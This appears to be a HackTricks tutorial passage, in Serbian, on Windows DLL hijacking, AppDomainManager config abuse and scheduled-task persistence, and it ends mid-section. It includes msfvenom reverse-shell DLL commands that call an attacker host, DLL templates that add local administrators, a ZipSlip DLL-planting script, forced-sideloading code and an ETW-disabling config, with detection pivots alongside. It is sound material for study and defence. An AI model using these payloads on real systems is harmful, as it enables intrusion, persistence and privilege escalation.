# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom tako da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda, postizanje persistence i, ređe, privilege escalation. Iako je ovde fokus na escalation-u, način hijacking-a ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking se koristi nekoliko metoda, a njihova efikasnost zavisi od strategije aplikacije za učitavanje DLL-ova:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz opcionalno korišćenje DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog DLL-a, čime se iskorišćava obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji će aplikacija učitati, verujući da je reč o nepostojećem, ali potrebnom DLL-u.
4. **DLL Redirection**: Izmena parametara pretrage kao što su `%PATH%` ili datoteka `.exe.manifest` / `.exe.local`, kako bi se aplikacija usmerila ka zlonamernom DLL-u.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernom verzijom u WinSxS direktorijumu, što je metoda često povezana sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika, zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasični DLL sideloading nije jedini način da se pouzdani **.NET Framework** proces natera da učita attacker kod. Ako je ciljna izvršna datoteka **managed** aplikacija, CLR takođe proverava konfiguracionu datoteku aplikacije nazvanu prema izvršnoj datoteci (na primer `Setup.exe.config`). Ta datoteka može definisati prilagođeni **AppDomainManager**. Ako konfiguracija upućuje na assembly pod kontrolom attackera koji se nalazi pored EXE datoteke, CLR ga učitava **pre uobičajenog toka koda aplikacije** i izvršava unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft .NET Framework configuration schema, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se prilagođeni manager koristio.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni menadžer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zasniva se na parsiranju CLR konfiguracije, a ne na Win32 redosledu pretrage DLL-ova.
- Host zaista mora biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header** u PE metapodacima.
- Naziv konfiguracione datoteke mora tačno odgovarati nazivu izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE datoteke**.
- Ovo je korisno sa **potpisanim Microsoft/vendor binarnim datotekama** jer pouzdani EXE ostaje neizmenjen, dok se zlonamerni managed assembly izvršava unutar istog procesa.
- Ako već imate direktorijum za instalaciju/ažuriranje sa dozvolom upisa, AppDomainManager hijacking može da se koristi kao **prva faza**, nakon čega slede klasični DLL sideloading ili reflective loading za naredne faze.

### AppDomainManager kao downloader + bootstrap za scheduled task

Praktičan obrazac intruzije jeste kombinovanje pouzdanog managed EXE-a sa zlonamernim `*.config` fajlom i zlonamernim AppDomainManager DLL-om koji služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET installer ili updater sa uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Konfiguracija u istom direktorijumu navodi CLR da učita attacker assembly **pre** nego što započne legitimna logika aplikacije.
3. Zlonamerni manager izvršava **path gate** (na primer, nastavlja samo ako se host EXE izvršava iz direktorijuma `Downloads`, a drugoj fazi dozvoljava izvršavanje samo iz `%LOCALAPPDATA%`).
4. Ako provera uspe, preuzima pravi payload u putanju sa dozvolom upisa za korisnika, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Potpisani host EXE ostaje neizmenjen, pa triage koji proverava samo hash glavnog binarnog fajla može da propusti kompromitaciju.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL trijade na Desktop, Temp ili putanju sandbox-a može namerno prekinuti lanac.
- AppDomainManager DLL prve faze može ostati mali i neupadljiv, dok se pravi implant preuzima kasnije.

Minimalni primer persistence-a koji se često viđa uz ovaj obrazac:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Napomene:
- ` /rl highest` znači **najviši dostupan nivo** za tog korisnika/sesiju; sam po sebi ne garantuje eskalaciju na SYSTEM.
- Ova tehnika se često tačnije klasifikuje kao **execution/persistence via .NET config abuse**, a ne kao klasični missing-DLL search-order hijacking, iako operatori često kombinuju obe tehnike.

Pivoti za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **ZIP extraction paths**, `Downloads`, `%TEMP%` ili drugih foldera u koje korisnik može da upisuje, sa **colocated** `<exe>.config` fajlom.
- Novi scheduled tasks čija akcija pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, sa nazivima koji imitiraju browser/vendor updater-e.
- Kratkotrajni managed bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se odmah prekidaju ako putanja izvršnog fajla ne odgovara očekivanom user-profile direktorijumu.

### Hijacking postojeće scheduled task za ponovno pokretanje sideload chain-a

Za persistence nemojte tražiti samo **kreiranje novog task-a**. Neke intrusion sets čekaju da legitimni installer kreira **normal updater task**, a zatim **prepišu task action** tako da postojeći naziv, autor i trigger ostanu poznati defenderima.

Ponovljivi workflow:
1. Instalirajte/pokrenite legitiman software i identifikujte task koji on obično kreira.
2. Exportujte task XML i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo action tako da task pokrene vaš **trusted host EXE** iz staging direktorijuma u koji korisnik može da upisuje; taj fajl zatim side-load-uje ili AppDomain-load-uje stvarni payload.
4. Ponovo registrujte isti naziv task-a umesto kreiranja novog očiglednog persistence artefakta.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je stealthier:
- Naziv taska i dalje može izgledati legitimno (na primer updater nekog vendora).
- **Task Scheduler service** ga pokreće, pa validacija parent/ancestor procesa često vidi očekivani scheduling chain umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive taskova** mogu propustiti task čija je registracija već postojala, ali čija akcija sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brzi hunting pivot-i:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML fajlove u `C:\Windows\System32\Tasks\*` i metadata u `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa baseline-om.
- Generišite alert kada **updater task koji izgleda kao vendor-ov** izvršava fajl iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa pridruženim `*.config` fajlom.

> [!TIP]
> Za chain korak po korak koji kombinuje HTML staging, AES-CTR configs i .NET implants sa DLL sideloading-om, pogledajte workflow u nastavku.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih Dll-ova

Najčešći način za pronalaženje nedostajućih Dll-ova unutar sistema jeste pokretanje alata [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals paketa i **podešavanje** **sledeća 2 filtera**:

![Common Techniques - Pronalaženje nedostajućih Dll-ova: Najčešći način za pronalaženje nedostajućih Dll-ova unutar sistema jeste pokretanje alata procmon iz sysinternals paketa i podešavanje sledeća 2 filtera](<../../../images/image (961).png>)

![Common Techniques - Pronalaženje nedostajućih Dll-ova: Najčešći način za pronalaženje nedostajućih Dll-ova unutar sistema jeste pokretanje alata procmon iz sysinternals paketa i podešavanje sledeća 2 filtera](<../../../images/image (230).png>)

i prikazivanje samo **File System Activity**:

![Common Techniques - Pronalaženje nedostajućih Dll-ova: i prikazivanje samo File System Activity](<../../../images/image (153).png>)

Ako tražite **nedostajuće dll-ove uopšteno**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući DLL unutar određenog izvršnog fajla**, podesite još jedan filter, kao što je **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite hvatanje događaja.<sup>[[9]](#references)</sup>

## Exploiting nedostajućih Dll-ova

Da biste eskalirali privilegije, potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. To se može dogoditi kada kontrolišete direktorijum koji se pretražuje pre direktorijuma koji sadrži legitimni DLL, ili kada traženi DLL ne postoji, a možete da upisujete u jedan od pretraživanih direktorijuma.

### Dll Search Order

**U okviru** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći način na koji se Dll-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih search path-ova**, prema određenom redosledu. Problem DLL hijacking-a nastaje kada se štetni DLL strateški postavi u jedan od ovih direktorijuma, čime se obezbeđuje njegovo učitavanje pre autentičnog DLL-a. Rešenje za sprečavanje ovoga jeste da aplikacija koristi apsolutne putanje kada navodi DLL-ove koji su joj potrebni.

U nastavku možete videti **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobavlja putanju ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment variable-u. Imajte na umu da ovo ne uključuje per-application putanju navedenu registarskim ključem **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju DLL search path-a.

To je **podrazumevani** redosled pretrage kada je **SafeDllSearchMode** omogućen. Kada je on onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevana vrednost je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa opcijom **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Konačno, DLL se može učitati apsolutnom putanjom umesto nazivom. U tom slučaju Windows traži sam DLL samo na toj putanji; dependencies zahtevane po nazivu i dalje prate odgovarajući search order.

Postoje i drugi načini za menjanje search order-a, ali ih ovde neću objašnjavati.

### Chaining proizvoljnog upisivanja fajla u hijack nedostajućeg DLL-a

1. Koristite **ProcMon** filtere (`Process Name` = ciljni EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje proces traži, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binary pokreće po **rasporedu ili kao service**, postavljanje DLL-a sa jednim od tih naziva u **application directory** (search-order entry #1) dovešće do njegovog učitavanja pri sledećem pokretanju. U jednom slučaju sa .NET scanner-om, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre učitavanja prave kopije iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **arbitrary write u stilu ZipSlip-a**, napravite ZIP čiji entry izlazi iz extraction direktorijuma, tako da DLL završi u app folderu:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadgledano sanduče/deljenje; kada zakazani zadatak ponovo pokrene proces, on učitava malicious DLL i izvršava vaš kod u kontekstu service account-a.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na DLL search path novokreiranog procesa jeste postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll native APIs. Ako ovde navedete direktorijum kojim upravlja attacker, ciljni proces koji razrešava imported DLL prema imenu (bez absolute path-a i bez korišćenja safe loading flags) može biti primoran da učita malicious DLL iz tog direktorijuma.

Key idea
- Napravite process parameters pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum u kom se nalaze vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binary razrešava DLL prema imenu, loader će tokom razrešavanja proveriti prosleđeni DllPath, čime se omogućava pouzdan DLL sideloading čak i kada se malicious DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Notes/limitations
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na current process.
- Cilj mora da importuje DLL ili da učitava DLL pomoću LoadLibrary prema imenu (bez absolute path-a i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths ne mogu biti hijack-ovani. Forwarded exports i SxS mogu promeniti redosled prioriteta.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Пример оперативне употребе
- Поставите malicious xmllite.dll (који извози потребне функције или прослеђује позиве стварној библиотеци) у ваш DllPath директоријум.
- Покрените signed binary за који је познато да помоћу наведене технике тражи xmllite.dll по имену. loader разрешава import преко наведеног DllPath-а и sideload-ује ваш DLL.

Ова техника је уочена у стварним нападима за покретање вишестепених sideloading ланаца: почетни launcher поставља helper DLL, који затим покреће Microsoft-signed, hijackable binary са прилагођеним DllPath-ом како би се принудило учитавање attacker-овог DLL-а из staging директоријума.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking преко `.exe.config`

За мете засноване на **.NET Framework-у**, sideloading се може извршити **пре `Main()`** без patching-а меморије, злоупотребом суседне **`.exe.config`** датотеке апликације. Уместо ослањања само на Win32 DLL search order, attacker поставља легитимни .NET EXE поред malicious конфигурације и једног или више assembly-ја под контролом attacker-а.

Како ланац функционише:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE се покреће, а **CLR чита `<exe>.config`**.
2. Конфигурација поставља **`<appDomainManagerAssembly>`** и **`<appDomainManagerType>`**, тако да runtime инстанцира `AppDomainManager` под контролом attacker-а.
3. Malicious manager добија извршавање **пре `Main()`** унутар trusted host процеса.
4. Иста конфигурација може приморати CLR да прво разрешава локалне assembly-је (на пример `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) и може ослабити runtime validation/telemetry без inline patching-а.

Образац у стилу campaign-а (тачно угњежђавање може да варира у зависности од директиве / CLR верзије):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava razrešavanje assembly-ja u direktorijumu aplikacije, pretvarajući fasciklu u predvidivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** prebacuju izvršavanje na attacker kod tokom CLR inicijalizacije, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti full-trust aplikaciji da učita unsigned ili izmenjene assembly-je bez greške validacije strong-name-a.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** izbegava preusmeravanja publisher policy-ja ka novijim assembly-jima.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a determinističkijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je posebno zanimljiv jer **CLR onemogućava sopstvenu ETW vidljivost** iz konfiguracije, umesto da implant u memoriji menja `EtwEventWrite`.

Operativni obrazac uočen u novijim kampanjama:
- Faza 1 postavlja `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Faza 2 ih kopira u uverljivu **AppData update** fasciklu, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **scheduled task-a**.
- Faza 3 proverava kontekst izvršavanja, na primer očekivanog roditelja `svchost.exe` iz Task Scheduler-a, pre učitavanja konačnog RAT DLL/export-a.

Ideje za hunting:
- Potpisani ili na drugi način legitimni **.NET executable-i** koji se pokreću sa sumnjivim susednim **`.config`** fajlovima na lokacijama u koje korisnik može da upisuje.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled task-ovi koji ponovo pokreću preimenovane update binarne fajlove iz **`%LOCALAPPDATA%`** ili iz app-specific direktorijuma `\bin\update\`.
- Lanci roditelj/dete u kojima scheduled task pokreće pouzdani .NET host koji odmah učitava assembly-je koji nisu od vendora iz sopstvenog direktorijuma.

#### Izuzeci u redosledu pretrage DLL-ova prema Windows dokumentaciji

Windows dokumentacija navodi određene izuzetke od standardnog redosleda pretrage DLL-ova:

- Kada se pronađe **DLL koji ima isto ime kao DLL koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga proverava redirekciju i manifest, a zatim se vraća na DLL koji je već u memoriji. **U ovom scenariju sistem ne obavlja pretragu DLL-a**.
- Ako je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim zavisnim DLL-ovima, **preskačući proces pretrage**. Registry ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga tih zavisnih DLL-ova obavlja se kao da su navedeni samo svojim **module name-ovima**, bez obzira na to da li je početni DLL identifikovan putem pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje), a kojem nedostaje DLL.
- Obezbedite **write pristup** svakom **direktorijumu** u kojem će se **DLL** tražiti. To može biti direktorijum executable-a ili direktorijum unutar system path-a.

Ovi preduslovi podrazumevano nisu uobičajeni: privilegovanim executable-ima obično ne nedostaju zavisnosti DLL-ova, a standardni korisnici uglavnom ne mogu da upisuju u direktorijume sistemskih search path-ova. Pogrešno konfigurisana okruženja ipak mogu ispuniti oba uslova.\
Ako su zahtevi ispunjeni, proverite projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj UAC bypass, sadrži DLL-hijacking PoC-ove za određene verzije Windows-a koji se često mogu prilagoditi direktorijumu sa write pristupom koji ste pronašli.

Imajte na umu da svoje **permisije u fascikli** možete proveriti pomoću:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih fascikli unutar PATH-a**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Možete proveriti i imports izvršne datoteke i exports DLL-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako **abuse Dll Hijacking to escalate privileges** sa dozvolama za pisanje u folderu **System Path** proverite:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo kom folderu unutar system PATH-a.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti jesu **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji je moguće iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste **kreiranje dll-a koji eksportuje najmanje sve funkcije koje će executable uvesti iz njega**. U svakom slučaju, imajte na umu da je Dll Hijacking koristan za [eskalaciju sa nivoa Medium Integrity na High **(zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako kreirati validan dll** možete pronaći u ovoj studiji o dll hijacking-u, usmerenoj na dll hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **naredno**m odeljku možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu zahtevane**.

## **Kreiranje i kompajliranje Dll-ova**

### **Dll Proxifying**

U osnovi, **Dll proxy** je Dll sposoban da **izvrši vaš maliciozni kod prilikom učitavanja**, ali i da **izloži** i **funkcioniše** kako je **očekivano**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete navesti executable i izabrati biblioteku koju želite da proxify-ujete, a zatim **generisati proxified dll**, ili **navesti Dll** i **generisati proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiranje korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **eksportuje svaku funkciju koju victim proces importuje**. Ako neki obavezni export nedostaje, binary ne može da ga razreši i exploit neće uspeti.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Hijacking OneCore TTS Localization DLL-a procesa Narrator (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivi, jezički specifični localization DLL koji može biti hijacked za proizvoljno izvršavanje koda i persistence.<sup>[[7]](#references)</sup>

Ključne činjenice
- Probe path (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore path postoji writable DLL pod kontrolom napadača, on se učitava i `DllMain(DLL_PROCESS_ATTACH)` se izvršava. Nisu potrebni nikakvi exports.

Otkrivanje pomoću Procmon-a
